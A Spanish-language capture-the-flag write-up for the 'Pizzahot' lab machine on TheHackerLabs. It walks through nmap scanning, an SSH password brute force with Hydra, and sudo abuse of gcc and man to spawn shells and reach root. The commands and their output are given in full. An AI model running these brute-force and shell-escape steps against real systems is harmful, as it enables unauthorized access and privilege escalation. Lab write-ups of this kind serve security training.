Propiedades:
- OS: Linux
- Plataforma: TheHackerLabs
- Nivel: Easy
- Tags: #ssh #bruteforce #sudo

![](../assets/Pasted image 20251205153349.png)
## Reconocimiento

Comienzo tirando un ping para comprobar conectividad.

```bash
> ping -c 1 192.168.1.207
--------------------------------------------------------
PING 192.168.1.207 (192.168.1.207) 56(84) bytes of data.
64 bytes from 192.168.1.207: icmp_seq=1 ttl=64 time=3.39 ms

--- 192.168.1.207 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 3.388/3.388/3.388/0.000 ms
```

Ahora procedo a realizar un escaneo con nmap para descubrir puertos abiertos.

```bash
> sudo nmap -p- -sS -Pn -n --min-rate 5000 -vvv 192.168.1.207
---------------------------------------------------------------
Scanned at 2025-12-05 15:35:08 CST for 7s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:7F:2B:81 (VMw
```

- Puerto 80 y 22 abiertos

Sobre los puertos abiertos realizo un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts predeterminados.

```bash
> sudo nmap - 22,80 -Pn -n -sV -sC -sS --min-rate 5000 -vvv 192.168.1.207 -oN target
---------------------------------------------------------------------------------------
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 0a:55:60:9b:4a:38:07:dc:5b:42:ea:bd:bb:52:63:7f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNzdSAj0lypAmp5u8tZFYv0biLlB0HfDPyEclgrXjHD+S9JQKPyLI/JVeRGZrL7lPJj6Lyd1kH/78mP8yo/Cq28=
|   256 e0:81:29:af:4e:2f:6a:55:8e:a0:02:1f:74:c7:fe:3a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAP4dkg3/p79K4nB/E8SrtYphdZGip1spJCZ58RZc6S4
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
|_http-title: Pizzahot
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-favicon: Unknown favicon MD5: 69C9AC38C922F4F247BF76DA8BCF5774
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 00:0C:29:7F:2B:81 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 80 HTTP: Apache/2.4.59
- Puerto 22 SSH: OpenSSH 9.2p1 Debian 2+deb12u2
## Enumeración

**Puerto 80 HTTP**

- Al parecer es una pagina de pizzas.

![](../assets/Pasted image 20251205155527.png)

**Source Code.**

En su codigo fuente podemos ver un comentario:
```html
<!-- Puedes creer que hay fanáticos de la pizza de piña que se ponen de usuario pizzapiña -->
```

- Posible usuario pizzapiña

Del codigo fuente también podemos rescatar los directorios:

- `/assets` - Aqui al parecer se almacenan imágenes, librerías y muchas otras cosas pero nada relevante.

## Explotación


**Brute Force.**

Sabiendo que tenemos un usuario llamado _pizzapiña_ y el servicio `SSH` esta abierto podemos tratar de realizar un ataque de fuerza bruta para encontrar la contraseña.

```bash
> hydra -l 'pizzapiña' -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.207 -t 10
---------------------------------------------------------------------------------------
[22][ssh] host: 192.168.1.207   login: pizzapiña   password: steven
```

- Credenciales encontradas pizzapiña:steven

Nos conectamos por `SSH`

```bash
> ssh pizzapiña@192.168.1.207
------------------------------
pizzapiña@pizzahot:~$ id
uid=1001(pizzapiña) gid=1001(pizzapiña) groups=1001(pizzapiña)
pizzapiña@pizzahot:~$ whoami
pizzapiña
pizzapiña@pizzahot:~$ 
```

## Escalada de Privilegios

Dentro del sistema lo primero que hago es echarle un vistazo al `/etc/passwd` para ver todos los usuarios

```bash
> cat /etc/passwd
--------------------
pizzasinpiña:x:1002:1002::/home/pizzasinpiña:/bin/bash
```

- Encuentro otro usuario llamado pizzasinpiña

Ahora procedo a enumerar binarios con privilegios de SUDO para el usuario pizzapiña:

```bash
pizzapiña@pizzahot:/home$ sudo -l
[sudo] password for pizzapiña: 
Matching Defaults entries for pizzapiña on pizzahot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pizzapiña may run the following commands on pizzahot:
    (pizzasinpiña) /usr/bin/gcc
```

- Encuentro que el usuario pizzasinpiña puede ejecutar el binario `gcc`

Con ayuda de [GTFOBins](https://gtfobins.github.io/gtfobins/gcc/) abuso del binario `gcc` y migro al usuario pizzasinpiña.

```bash
pizzapiña@pizzahot:/home$ sudo -u pizzasinpiña /usr/bin/gcc -wrapper /bin/sh,-s .
-----------------------------------------------------------------------------------
$ whoami
pizzasinpiña
$ id
uid=1002(pizzasinpiña) gid=1002(pizzasinpiña) groups=1002(pizzasinpiña)
```

Ahora que ya somos el usuario pizzasinpiña vamos a realizar el mismo proceso. Enumeramos binarios con privilegios de SUDO:

```bash
pizzasinpiña@pizzahot:~$ sudo -l
Matching Defaults entries for pizzasinpiña on pizzahot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pizzasinpiña may run the following commands on pizzahot:
    (root) NOPASSWD: /usr/bin/man
    (ALL) NOPASSWD: /usr/bin/sudo -l
```

- Encontramos el binario `man`


Vuelvo a utilizar [GTFObins](https://gtfobins.github.io/gtfobins/man/) para abusar del binario `man` y escalar a root.

```bash
pizzasinpiña@pizzahot:~$ sudo man man
!/bin/sh
```

Somos root:

```bash
root@pizzahot:/home/pizzasinpiña# whoami
root
root@pizzahot:/home/pizzasinpiña# id
uid=0(root) gid=0(root) groups=0(root)
```


***PWNED***

